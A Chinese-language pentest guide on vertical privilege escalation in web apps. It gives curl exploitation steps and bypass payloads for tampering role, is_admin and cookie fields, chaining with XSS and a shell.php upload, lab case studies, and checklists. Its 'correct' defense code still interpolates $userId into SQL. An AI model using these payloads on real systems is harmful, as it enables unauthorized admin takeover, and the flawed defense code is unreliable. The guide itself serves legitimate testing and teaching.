# **垂直权限提升**

**文档说明：** 本文档提供垂直权限提升漏洞的系统化检测与利用方法，指导渗透测试人员识别并利用权限验证缺陷，从低权限角色提升至高权限角色。

---

# **第一部分：文档概述**

## **1.1 编写目的**
- 为渗透测试人员提供垂直权限提升测试与利用的标准化流程
- 帮助理解垂直权限提升的原理和常见模式
- 提供参数篡改、客户端控制绕过等高级利用技术

## **1.2 适用范围**
- 适用于普通用户可访问管理员功能的场景
- 适用于权限字段可篡改的应用
- 适用于客户端权限控制（disabled 字段）可绕过的场景
- 适用于 CTF 挑战、渗透测试项目中的权限提升场景

## **1.3 读者对象**
- 执行渗透测试任务的安全工程师
- 负责代码审计的开发人员
- CTF 参赛选手

---

# **第二部分：核心渗透技术专题**

## **专题：垂直权限提升**

# **2.1 技术介绍**

**漏洞原理：**
垂直权限提升（Vertical Privilege Escalation）是指低权限用户能够执行高权限用户才能执行的操作。这通常发生在应用程序未正确验证用户权限级别的场景中。

**本质：** 应用层权限验证机制缺失或缺陷，导致权限边界被突破。

**常见漏洞代码模式：**
```php
// 漏洞代码示例 - 无权限检查
// 管理员功能未检查用户角色
function deleteUser($userId) {
    // 缺少权限检查：if (!isAdmin()) die("Forbidden");
    db_query("DELETE FROM users WHERE id = $userId");
}

// 漏洞代码示例 - 客户端权限控制
// 前端 disabled 字段，后端未验证
<input type="checkbox" name="is_admin" disabled>
// 攻击者可移除 disabled 并勾选
```

**权限模型：**
```
权限层级：
anon (0) → user (1) → moderator (2) → admin (3)

垂直权限提升：
anon → admin (跨越多级)
user → admin (跨越多级)
moderator → admin (单级提升)
```

# **2.2 攻击常见于哪些业务场景**

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **用户管理** | 删除用户、修改角色 | 普通用户可执行管理员操作 |
| **内容管理** | 删除文章、置顶帖子 | 普通用户可管理所有内容 |
| **系统配置** | 修改系统设置 | 普通用户可修改配置 |
| **文件管理** | 删除文件、上传文件 | 普通用户可管理文件 |
| **注册流程** | 自选角色/权限字段 | 用户可自选管理员角色 |
| **CTF 挑战** | 权限字段可篡改 | 修改参数获取 admin 权限 |

# **2.3 漏洞探测方法**

## **2.3.1 输入点识别**
- 识别所有与权限相关的参数：`role`、`is_admin`、`permission`、`privilege`
- 识别管理功能端点：`/admin/*`、`/manage/*`、`/delete/*`、`/config/*`

## **2.3.2 初步探测**

**步骤 1：检查权限参数**
```bash
# 查看注册/用户信息表单
curl http://target.com/register | grep -i "role\|admin\|permission"

# 查看用户信息 API
curl http://target.com/api/user/me
# 检查响应中是否包含 role/is_admin 字段
```

**步骤 2：测试权限参数可篡改性**
```bash
# 尝试修改角色参数
curl -X PUT http://target.com/api/user/me \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# 尝试添加 is_admin 字段
curl -X PUT http://target.com/api/user/me \
  -H "Content-Type: application/json" \
  -d '{"is_admin":true}'
```

**步骤 3：测试管理功能访问**
```bash
# 直接访问管理端点
curl http://target.com/admin/users
curl http://target.com/admin/config

# 如果返回 200 且无权限检查，可能存在垂直权限提升
```

## **2.3.3 白盒测试**
- 代码审计：搜索权限检查函数 `isAdmin()`、`checkPermission()`、`requireRole()`
- 检查管理功能端点是否有权限验证逻辑
- 检查客户端提交的权限参数是否被信任

# **2.4 漏洞利用方法**

## **2.4.1 参数篡改提升权限**

**场景：** 应用接受客户端提交的角色/权限参数

**利用步骤：**
```bash
# 步骤 1：识别权限参数
curl http://target.com/register | grep -A5 -B5 "role"

# 步骤 2：篡改权限参数注册
curl -X POST http://target.com/register \
  -d "username=attacker" \
  -d "email=attacker@test.com" \
  -d "password=password123" \
  -d "role=admin"

# 步骤 3：验证权限提升
curl http://target.com/api/user/me
# 检查 role 字段是否为"admin"
```

## **2.4.2 客户端权限控制绕过**

**场景：** 前端使用 disabled 字段限制权限选择

**利用步骤：**
```bash
# 原始表单（前端限制）
<input type="checkbox" name="is_premium" disabled>

# 绕过方法 1：移除 disabled 并提交
curl -X POST http://target.com/upgrade \
  -d "is_premium=on"

# 绕过方法 2：直接调用 API
curl -X POST http://target.com/api/user/upgrade \
  -H "Content-Type: application/json" \
  -d '{"is_premium":true}'
```

## **2.4.3 自授权垂直权限提升**

**场景：** 用户可修改自己的权限/角色

**利用步骤：**
```bash
# 步骤 1：查看当前用户信息
curl http://target.com/api/user/me
# 返回：{"id":1,"username":"attacker","role":"user"}

# 步骤 2：修改自己的角色
curl -X PUT http://target.com/api/user/me \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# 步骤 3：验证权限提升
curl http://target.com/admin/users
# 如果可访问，权限提升成功
```

## **2.4.4 多步骤流程权限绕过**

**场景：** 注册流程多步骤，权限检查在客户端

**利用步骤：**
```bash
# 步骤 1：开始注册流程
curl -X POST http://target.com/register/start \
  -d "username=attacker"

# 步骤 2：跳过支付/验证步骤，直接设置权限
curl -X POST http://target.com/register/complete \
  -d "role=admin" \
  -d "is_premium=true"

# 步骤 3：验证权限
curl http://target.com/api/user/me
```

## **2.4.5 Cookie/Token 权限篡改**

**场景：** 权限信息存储在 Cookie 或 Token 中

**利用步骤：**
```bash
# 查看当前 Cookie
curl -I http://target.com/ | grep "Set-Cookie"

# 如果 Cookie 中包含角色信息（如 role=user）
# 修改为 admin
curl -H "Cookie: role=admin; session=xxx" http://target.com/admin

# 如果 Token 中包含角色信息（JWT）
# 解码 JWT，修改 role 字段，重新签名（如果密钥已知或无签名）
```

# **2.5 绕过方法**

## **2.5.1 绕过角色白名单**

**过滤规则：** 角色字段有白名单验证

**绕过 Payload：**
```bash
# 尝试大小写变异
curl -X POST http://target.com/register \
  -d "role=Admin"
curl -X POST http://target.com/register \
  -d "role=ADMIN"
curl -X POST http://target.com/register \
  -d "role=aDmIn"

# 尝试角色 ID
curl -X POST http://target.com/register \
  -d "role_id=1"  # 假设 1 是 admin

# 尝试数组注入
curl -X POST http://target.com/register \
  -d "role[]=user&role[]=admin"
```

## **2.5.2 绕过权限检查逻辑**

**场景：** 应用使用简单权限检查

**绕过方法：**
```bash
# 如果检查 is_admin == true
curl -X POST http://target.com/action \
  -d "is_admin=1"
curl -X POST http://target.com/action \
  -d "is_admin=yes"
curl -X POST http://target.com/action \
  -d "is_admin=true"

# 如果检查 role == "admin"
curl -X POST http://target.com/action \
  -d "role=administrator"
curl -X POST http://target.com/action \
  -d "role=super_admin"
```

## **2.5.3 组合其他漏洞利用**

**场景：** 垂直权限提升 + 其他漏洞组合

**组合攻击示例：**
```bash
# 垂直权限提升 + XSS
# 1. 提升权限为 admin
curl -X PUT http://target.com/api/user/me \
  -d '{"role":"admin"}'

# 2. 利用 admin 权限注入 XSS
curl -X POST http://target.com/admin/announcement \
  -d "content=<script>alert('XSS')</script>"

# 垂直权限提升 + 文件上传
# 1. 提升权限为 admin
# 2. 利用 admin 文件上传功能
curl -X POST http://target.com/admin/upload \
  -F "file=@shell.php"
```

# **2.6 实战案例**

## **案例：Django 应用注册流程垂直权限提升**

**目标：** 通过篡改注册流程中的 is_premium 字段实现权限提升

**步骤 1：分析注册流程**
```bash
# 查看注册表单
curl http://target.com/register | grep -A10 "form"

# 发现隐藏的 is_premium 字段（前端 disabled）
<input type="checkbox" name="is_premium" disabled>
```

**步骤 2：绕过前端限制**
```bash
# 直接提交带 is_premium 的请求
curl -X POST http://target.com/register \
  -d "username=attacker" \
  -d "email=attacker@test.com" \
  -d "password=password123" \
  -d "is_premium=on"

# 返回：注册成功
```

**步骤 3：验证权限提升**
```bash
# 登录后查看用户信息
curl http://target.com/api/user/me

# 返回：{"username":"attacker","is_premium":true}
# 权限提升成功
```

## **案例：Encoder64 Blog 文件上传垂直权限提升**

**目标：** 匿名访问应受限的文件上传功能

**步骤 1：识别应受限功能**
```bash
# 文件上传功能应该需要认证
curl http://localhost:36367/posts/upload-article.php

# 返回：200 OK（无认证要求）
```

**步骤 2：利用无认证访问**
```bash
# 直接访问上传功能（无需登录）
curl http://localhost:36367/posts/upload-article.php

# 上传文件（匿名）
curl -X POST http://localhost:36367/posts/upload-article.php \
  -F "name=Anonymous" \
  -F "email=anon@test.com" \
  -F "articleFile=@malicious.html"
```

**步骤 3：验证权限提升**
```bash
# 访问上传的文件
curl http://localhost:36367/posts/uploads/malicious.html

# 结果：匿名用户成功执行了应受限的文件上传操作
# 垂直权限提升：anon → admin（文件上传是管理员功能）
```

---

# **第三部分：附录**

## **3.1 权限提升检测清单**

| **检测项** | **检测方法** | **漏洞特征** |
| :--- | :--- | :--- |
| 角色参数篡改 | 修改 role 参数提交 | 服务器接受修改 |
| 权限字段篡改 | 修改 is_admin 等字段 | 服务器接受修改 |
| 客户端控制绕过 | 移除 disabled 提交 | 服务器接受请求 |
| 管理端点访问 | 直接访问/admin/* | 返回 200 无拒绝 |
| 自授权修改 | 修改自己的角色 | 修改成功 |
| Cookie 篡改 | 修改 Cookie 中的角色 | 权限变化 |

## **3.2 常用 Payload 速查表**

| **Payload 类型** | **示例** | **说明** |
| :--- | :--- | :--- |
| 角色篡改 | `"role":"admin"` | 直接设置为 admin |
| 权限字段 | `"is_admin":true` | 设置管理员标志 |
| 角色 ID | `"role_id":1` | 使用角色 ID |
| 大小写变异 | `"role":"Admin"` | 绕过白名单 |
| 数组注入 | `"role":["user","admin"]` | 数组注入 |
| Cookie 篡改 | `Cookie: role=admin` | 修改 Cookie |
| 前端绕过 | 移除 disabled 提交 | 绕过前端限制 |

## **3.3 利用决策流程图**

```
                    ┌─────────────────┐
                    │  发现目标功能    │
                    │  管理/配置/删除  │
                    └────────┬────────┘
                             │
                             ▼
                    ┌─────────────────┐
                    │  测试直接访问    │
                    │  无认证访问端点  │
                    └────────┬────────┘
                             │
                ┌────────────┴────────────┐
                │                         │
                ▼                         ▼
        ┌──────────────┐          ┌──────────────┐
        │  访问被拒绝   │          │  访问成功     │
        └──────┬───────┘          └──────┬───────┘
               │                         │
               ▼                         ▼
        ┌──────────────┐          ┌──────────────┐
        │  寻找其他途径 │          │  漏洞存在     │
        │  参数篡改     │          │  深度利用     │
        └──────┬───────┘          └──────────────┘
               │
               ▼
        ┌──────────────┐
        │  识别权限参数│
        │  role/is_admin│
        └──────┬───────┘
               │
               ▼
        ┌──────────────┐
        │  篡改参数提交│
        │  验证提升结果│
        └──────────────┘
```

## **3.4 防御建议**

**服务端防御：**
```php
// 正确的权限检查
function deleteUser($userId) {
    session_start();

    // 检查是否登录
    if (!isset($_SESSION['user_id'])) {
        http_response_code(401);
        die("Authentication required");
    }

    // 检查是否为管理员
    if ($_SESSION['role'] !== 'admin') {
        http_response_code(403);
        die("Insufficient privileges");
    }

    // 执行删除操作
    db_query("DELETE FROM users WHERE id = $userId");
}

// 不信任客户端提交的权限参数
function updateUser($userId, $params) {
    // 移除客户端提交的权限参数
    unset($params['role']);
    unset($params['is_admin']);
    unset($params['permission']);

    // 只更新允许的字段
    db_query("UPDATE users SET username=?, email=? WHERE id=?",
        [$params['username'], $params['email'], $userId]);
}
```

## **3.5 CWE-284 不当访问控制测试**

### 3.5.1 权限管理测试

**测试目标**：检测权限提升/降级是否正确配对，异常路径是否处理

**测试方法**：
```bash
# 1. 测试异常处理
# 如果权限提升后发生异常，权限是否正确降级？

# 2. 测试默认配置
# 检查是否有硬编码密码或默认设置允许未认证访问

# 3. 测试调试接口
# UART、JTAG 等调试端口是否需认证
```

### 3.5.2 授权检查测试

**测试要点**：
```
□ 确认每个敏感操作前都有授权验证
□ 验证所有表单/API 端点都检查认证状态
□ 测试默认设置是否允许未认证访问
□ 检查 ACL 解析错误是否正确失败（fail closed）
```

### 3.5.3 已知 CVE 利用案例

| CVE | 利用方式 |
|-----|---------|
| CVE-2021-21972 | 云虚拟化平台上传 tar 文件无需认证 + 路径遍历 |
| CVE-2021-35033 | WiFi 路由器固件使用硬编码密码绕过 UART 端口认证 |
| CVE-2020-10263 | 蓝牙扬声器调试功能无需认证，获取 root shell |
| CVE-2022-24985 | 表单网站仅检查单个表单的会话认证状态 |

## **3.6 OWASP Top 10:2025 A01 权限提升测试**

### 3.6.1 测试检查清单

```
□ 测试默认拒绝策略
□ 测试通过修改 URL 绕过访问控制
□ 测试通过修改内部应用状态绕过访问控制
□ 测试通过修改 HTML 页面绕过访问控制
□ 测试 API 的 POST、PUT、DELETE 访问控制
□ 测试权限提升（未登录或以超出预期的权限操作）
□ 测试元数据操纵（JWT、Cookie 或隐藏字段）
□ 测试 CORS 配置错误
□ 测试强制浏览（猜测 URL）
```

### 3.6.2 业务限制测试

```
测试域模型执行的业务限制：
1. 用户能否自选角色/权限？
2. 支付/验证流程可否跳过？
3. 多步骤流程可否绕过前置步骤？
4. 客户端控制（disabled 字段）可否绕过？
```

---

**文档版本：** 1.0
**最后更新：** 2026 年 3 月
**适用技能：** broken-access-control
**关联 OWASP Top 10：** A01:2025 - Broken Access Control
**关联 CWE：** CWE-284, CWE-285, CWE-639
